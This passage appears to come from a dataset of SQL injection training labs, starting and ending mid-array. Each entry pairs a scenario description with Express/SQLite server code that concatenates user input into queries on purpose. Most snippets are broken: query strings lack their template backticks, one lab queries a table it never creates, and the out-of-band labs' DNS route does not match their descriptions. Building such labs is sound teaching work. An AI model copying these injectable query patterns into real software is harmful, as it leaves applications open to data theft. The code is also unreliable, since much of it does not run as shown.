  "Lab scenario": "Blind SQL injection with out-of-band interaction",
"Lab Description": "This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.\nTo solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.",
"Vulnerability name": "SQL injection",
"lab level": "Hard",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst cookieParser = require('cookie-parser');\nconst dns = require('dns');\n\nconst app = express();\napp.use(cookieParser());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('administrator', 'admin123')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user1', 'password1')\");\n});\n\napp.get('/', (req, res) => {\n  const trackingId = req.cookies.trackingId || '1';\n  const query = `SELECT username FROM users WHERE id = ${trackingId}`;\n  db.get(query, (err, row) => {\n    if (err) {\n      res.status(500).send(\"Error occurred.\");\n    } else if (row) {\n      res.send(`Welcome, ${row.username}!`);\n    } else {\n      res.send(\"User not found.\");\n    }\n  });\n});\n\napp.get('/dns', (req, res) => {\n  const trackingId = req.cookies.trackingId || '1';\n  const domain = 'example.com'; // Replace with Burp Collaborator domain\n  dns.lookup(trackingId + '.' + domain, (err, address, family) => {\n    if (err) {\n      res.status(500).send(\"DNS lookup failed.\");\n    } else {\n      res.send(`DNS lookup successful: ${address}`);\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"

},
{
  "Lab scenario": "Blind SQL injection with out-of-band data exfiltration",
  "Lab Description": "This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.\nThe database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.\nTo solve the lab, log in as the administrator user.",
  "Vulnerability name": "SQL injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst cookieParser = require('cookie-parser');\nconst dns = require('dns');\n\nconst app = express();\napp.use(cookieParser());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('administrator', 'admin123')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user1', 'password1')\");\n});\n\napp.get('/', (req, res) => {\n  const trackingId = req.cookies.trackingId || '1';\n  const query = `SELECT username FROM users WHERE id = ${trackingId}`;\n  db.get(query, (err, row) => {\n    if (err) {\n      res.status(500).send(\"Error occurred.\");\n    } else if (row) {\n      res.send(`Welcome, ${row.username}!`);\n    } else {\n      res.send(\"User not found.\");\n    }\n  });\n});\n\napp.get('/dns', (req, res) => {\n  const trackingId = req.cookies.trackingId || '1';\n  const domain = 'example.com'; // Replace with Burp Collaborator domain\n  dns.lookup(trackingId + '.' + domain, (err, address, family) => {\n    if (err) {\n      res.status(500).send(\"DNS lookup failed.\");\n    } else {\n      res.send(`DNS lookup successful: ${address}`);\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});" 
},
{
  "Lab scenario": "SQL injection with filter bypass via XML encoding",
  "Lab Description": "This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.\nThe database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.",
  "Vulnerability name": "SQL injection",
   "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\n\nconst app = express();\napp.use(bodyParser.text({ type: 'application/xml' }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('administrator', 'admin123')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user1', 'password1')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user2', 'password2')\");\n\n  db.run(\"CREATE TABLE stock (id INTEGER PRIMARY KEY, product TEXT, quantity INTEGER)\");\n  db.run(\"INSERT INTO stock (product, quantity) VALUES ('Laptop', 10)\");\n  db.run(\"INSERT INTO stock (product, quantity) VALUES ('Phone', 20)\");\n});\n\napp.post('/stock', (req, res) => {\n  xml2js.parseString(req.body, (err, result) => {\n    if (err) {\n      res.status(400).send(\"Invalid XML\");\n      return;\n    }\n    const product = result.stock.product[0];\n    const query = `SELECT product, quantity FROM stock WHERE product = '${product}'`;\n    console.log(\"Executing query:\", query);\n\n    db.all(query, [], (err, rows) => {\n      if (err) {\n        res.status(500).send(\"Error occurred.\");\n      } else {\n        res.json(rows);\n      }\n    });\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
},
{
  "Lab scenario": "SQL injection in search filter with parameter manipulation",
  "Lab Description": "This lab simulates a search endpoint where user-provided filters are concatenated into a query. The lack of proper sanitization allows attackers to manipulate parameters to retrieve unauthorized data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE items (id INTEGER PRIMARY KEY, name TEXT, price REAL)\");\n  db.run(\"INSERT INTO items (name, price) VALUES ('Book', 10.99)\");\n});\n\napp.get('/filter', (req, res) => {\n  const filter = req.query.filter;\n  const query = SELECT * FROM items WHERE name = '${filter}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection with dynamic sorting vulnerability",
  "Lab Description": "This lab exposes a vulnerability where the sort column in a query is dynamically constructed from user input without proper validation. Attackers can inject arbitrary SQL into the ORDER BY clause.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, price REAL)\");\n  db.run(\"INSERT INTO products (name, price) VALUES ('Phone', 699)\");\n});\n\napp.get('/sort', (req, res) => {\n  const sortBy = req.query.sortBy;\n  const query = SELECT * FROM products ORDER BY ${sortBy};\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in report generation with unsanitized date inputs",
  "Lab Description": "This lab simulates a reporting system where date parameters are not validated. Attackers can inject malicious SQL in the date fields to manipulate report queries.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE reports (id INTEGER PRIMARY KEY, report_date TEXT, content TEXT)\");\n  db.run(\"INSERT INTO reports (report_date, content) VALUES ('2023-01-01', 'Initial Report')\");\n});\n\napp.post('/report', (req, res) => {\n  const date = req.body.date;\n  const query = SELECT * FROM reports WHERE report_date = '${date}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in file download endpoint",
  "Lab Description": "This lab demonstrates a vulnerability in a file download feature where user input is directly appended to the SQL query. Attackers can modify the query to download unintended files.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE files (id INTEGER PRIMARY KEY, filename TEXT, content TEXT)\");\n  db.run(\"INSERT INTO files (filename, content) VALUES ('secret.txt', 'Top secret file content')\");\n});\n\napp.get('/download', (req, res) => {\n  const file = req.query.file;\n  const query = SELECT content FROM files WHERE filename = '${file}';\n  console.log('Executing query:', query);\n  db.get(query, [], (err, row) => {\n    if (err) res.status(500).send('Error occurred');\n    else if (row) res.send(row.content);\n    else res.send('File not found');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in data export functionality",
  "Lab Description": "This lab simulates a data export module where user inputs are concatenated into an SQL query, allowing attackers to modify the export query and extract additional data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE exportData (id INTEGER PRIMARY KEY, info TEXT)\");\n  db.run(\"INSERT INTO exportData (info) VALUES ('Sensitive Export Data')\");\n});\n\napp.post('/export', (req, res) => {\n  const filter = req.body.filter;\n  const query = SELECT * FROM exportData WHERE info LIKE '%${filter}%';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection via concatenated LIKE clause injection",
  "Lab Description": "This lab exposes a vulnerability in a search function where user input is used in a LIKE clause without proper sanitization, allowing attackers to manipulate the search condition.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE articles (id INTEGER PRIMARY KEY, title TEXT, content TEXT)\");\n  db.run(\"INSERT INTO articles (title, content) VALUES ('Tech Trends', 'Latest technology news')\");\n});\n\napp.get('/search', (req, res) => {\n  const keyword = req.query.keyword;\n  const query = SELECT * FROM articles WHERE title LIKE '%${keyword}%';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in user role management",
  "Lab Description": "This lab simulates an admin panel for user role management where user input is directly concatenated into a query. Attackers can inject SQL to change user roles and escalate privileges.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE roles (id INTEGER PRIMARY KEY, username TEXT, role TEXT)\");\n  db.run(\"INSERT INTO roles (username, role) VALUES ('user1', 'user')\");\n});\n\napp.post('/updateRole', (req, res) => {\n  const username = req.body.username;\n  const newRole = req.body.newRole;\n  const query = UPDATE roles SET role = '${newRole}' WHERE username = '${username}';\n  console.log('Executing query:', query);\n  db.run(query, [], function(err) {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Role updated');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in session token retrieval",
  "Lab Description": "This lab demonstrates a vulnerability in an endpoint that retrieves session tokens. The unsanitized input allows attackers to inject SQL and obtain session tokens for unauthorized access.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE sessions (id INTEGER PRIMARY KEY, token TEXT)\");\n  db.run(\"INSERT INTO sessions (token) VALUES ('session123')\");\n});\n\napp.post('/getSession', (req, res) => {\n  const token = req.body.token;\n  const query = SELECT * FROM sessions WHERE token = '${token}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in email subscription form",
  "Lab Description": "This lab simulates an email subscription form where the user\u2019s email is directly concatenated into an INSERT query, making it vulnerable to SQL injection. Attackers can inject SQL to manipulate the subscribers list.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE subscribers (id INTEGER PRIMARY KEY, email TEXT)\");\n});\n\napp.post('/subscribe', (req, res) => {\n  const email = req.body.email;\n  const query = INSERT INTO subscribers (email) VALUES ('${email}');\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Subscription successful');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection with extra whitespace injection",
  "Lab Description": "This lab demonstrates a vulnerability where extra whitespace characters are not trimmed before being concatenated into the SQL query, allowing attackers to inject malicious payloads.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user1', 'pass1')\");\n});\n\napp.get('/whitespace', (req, res) => {\n  let username = req.query.username; // Not trimming input\n  const query = SELECT * FROM users WHERE username = '${username}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in URL parameter exploitation",
  "Lab Description": "This lab simulates a vulnerability where URL parameters are directly used in constructing SQL queries without sanitization. Attackers can modify URL parameters to inject SQL and retrieve unauthorized data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE articles (id INTEGER PRIMARY KEY, title TEXT, content TEXT)\");\n  db.run(\"INSERT INTO articles (title, content) VALUES ('News', 'Breaking news content')\");\n});\n\napp.get('/articles', (req, res) => {\n  const id = req.query.id;\n  const query = SELECT * FROM articles WHERE id = '${id}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in admin panel access",
  "Lab Description": "This lab simulates an admin login panel where unsanitized inputs allow attackers to bypass authentication and access admin functionalities. The attacker can inject SQL to log in as an administrator.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE admins (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO admins (username, password) VALUES ('admin', 'admin123')\");\n});\n\napp.post('/adminLogin', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = SELECT * FROM admins WHERE username = '${username}' AND password = '${password}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else if (rows.length > 0) res.send('Admin login successful');\n    else res.send('Login failed');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in payment gateway error logging",
  "Lab Description": "This lab demonstrates a vulnerability in a payment gateway where unsanitized inputs in error logging lead to SQL injection, allowing attackers to retrieve or modify transaction logs.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE logs (id INTEGER PRIMARY KEY, error TEXT)\");\n  db.run(\"INSERT INTO logs (error) VALUES ('Payment error')\");\n});\n\napp.post('/logError', (req, res) => {\n  const errorDetail = req.body.errorDetail;\n  const query = INSERT INTO logs (error) VALUES ('${errorDetail}');\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Error logged');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in automated notification system",
  "Lab Description": "This lab simulates a notification system where SQL queries are built dynamically from user input. Due to unsanitized inputs, attackers can inject SQL commands to alter notification data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE notifications (id INTEGER PRIMARY KEY, message TEXT)\");\n  db.run(\"INSERT INTO notifications (message) VALUES ('Your order has shipped')\");\n});\n\napp.post('/notify', (req, res) => {\n  const message = req.body.message;\n  const query = UPDATE notifications SET message = '${message}' WHERE id = 1;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Notification updated');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in feedback rating system",
  "Lab Description": "This lab demonstrates a vulnerability in a feedback rating system where user ratings are inserted into the database without proper sanitization. Attackers can manipulate the SQL query to alter feedback scores.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE ratings (id INTEGER PRIMARY KEY, user TEXT, score INTEGER)\");\n  db.run(\"INSERT INTO ratings (user, score) VALUES ('user1', 5)\");\n});\n\napp.post('/rate', (req, res) => {\n  const user = req.body.user;\n  const score = req.body.score;\n  const query = INSERT INTO ratings (user, score) VALUES ('${user}', ${score});\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Rating submitted');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in multi-tenant application",
  "Lab Description": "This lab simulates a multi-tenant application where SQL queries are built from tenant identifiers provided by the user. Unsanitized tenant input allows attackers to access data across tenants.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE tenant_data (id INTEGER PRIMARY KEY, tenant TEXT, data TEXT)\");\n  db.run(\"INSERT INTO tenant_data (tenant, data) VALUES ('tenant1', 'Sensitive Data 1')\");\n});\n\napp.post('/data', (req, res) => {\n  const tenant = req.body.tenant;\n  const query = SELECT data FROM tenant_data WHERE tenant = '${tenant}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection with JSON payload vulnerability",
  "Lab Description": "This lab demonstrates a vulnerability where a JSON payload is directly concatenated into an SQL query without proper parsing or sanitization, allowing attackers to inject SQL code.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE orders (id INTEGER PRIMARY KEY, details TEXT)\");\n  db.run(\"INSERT INTO orders (details) VALUES ('Order details here')\");\n});\n\napp.post('/order', (req, res) => {\n  const details = req.body.details; // JSON as string\n  const query = SELECT * FROM orders WHERE details = '${details}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in dashboard query parameters",
  "Lab Description": "This lab simulates a dashboard where query parameters are directly used to construct SQL queries. Attackers can inject SQL to manipulate the dashboard data views.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE dashboard (id INTEGER PRIMARY KEY, metric TEXT, value REAL)\");\n  db.run(\"INSERT INTO dashboard (metric, value) VALUES ('Sales', 1500)\");\n});\n\napp.get('/dashboard', (req, res) => {\n  const metric = req.query.metric;\n  const query = SELECT * FROM dashboard WHERE metric = '${metric}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in caching layer bypass",
  "Lab Description": "This lab demonstrates a caching layer vulnerability where the cache key is constructed unsafely from user input. Attackers can inject SQL to bypass caching and retrieve fresh data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\n// Simulated cache (not secure)\nlet cache = {};\n\napp.post('/cacheData', (req, res) => {\n  const key = req.body.key;\n  const query = SELECT * FROM dashboard WHERE metric = '${key}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else {\n      cache[key] = rows;\n      res.json(rows);\n    }\n  });\n});\n\napp.get('/cacheData', (req, res) => {\n  const key = req.query.key;\n  if (cache[key]) res.json(cache[key]);\n  else res.send('No cached data');\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection with malformed SQL query construction",
  "Lab Description": "This lab simulates a scenario where a poorly constructed SQL query due to improper concatenation leads to SQL injection vulnerabilities. Attackers can manipulate the query syntax to gain unauthorized access.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'adminpass')\");\n});\n\napp.get('/malformed', (req, res) => {\n  const input = req.query.input;\n  // Malformed query due to poor concatenation\n  const query = \"SELECT * FROM users WHERE username = '\" + input;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in product recommendation engine",
  "Lab Description": "This lab simulates a product recommendation system where user preferences are used directly in SQL queries. Attackers can inject SQL to alter recommendation results and access data from unrelated tables.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE recommendations (id INTEGER PRIMARY KEY, user_pref TEXT, suggestion TEXT)\");\n  db.run(\"INSERT INTO recommendations (user_pref, suggestion) VALUES ('electronics', 'Smartphone')\");\n});\n\napp.post('/recommend', (req, res) => {\n  const pref = req.body.user_pref;\n  const query = SELECT * FROM recommendations WHERE user_pref = '${pref}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in social media comment posting",
  "Lab Description": "This lab simulates a social media platform's comment posting feature. Unsanitized input in the comment submission allows attackers to inject SQL and manipulate or extract comments.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE comments (id INTEGER PRIMARY KEY, comment TEXT)\");\n  db.run(\"INSERT INTO comments (comment) VALUES ('Nice post!')\");\n});\n\napp.post('/postComment', (req, res) => {\n  const comment = req.body.comment;\n  const query = INSERT INTO comments (comment) VALUES ('${comment}');\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Comment posted');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in dynamic menu generation",
  "Lab Description": "This lab simulates a dynamic menu generation system where menu items are generated based on user input. Unsanitized input leads to SQL injection, allowing attackers to alter the menu contents.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE menu (id INTEGER PRIMARY KEY, item TEXT)\");\n  db.run(\"INSERT INTO menu (item) VALUES ('Home')\");\n});\n\napp.get('/menu', (req, res) => {\n  const filter = req.query.filter;\n  const query = SELECT * FROM menu WHERE item = '${filter}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in scheduling module",
  "Lab Description": "This lab simulates a scheduling system where appointment times provided by the user are concatenated into an SQL query. Attackers can inject SQL commands to alter or retrieve scheduling data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
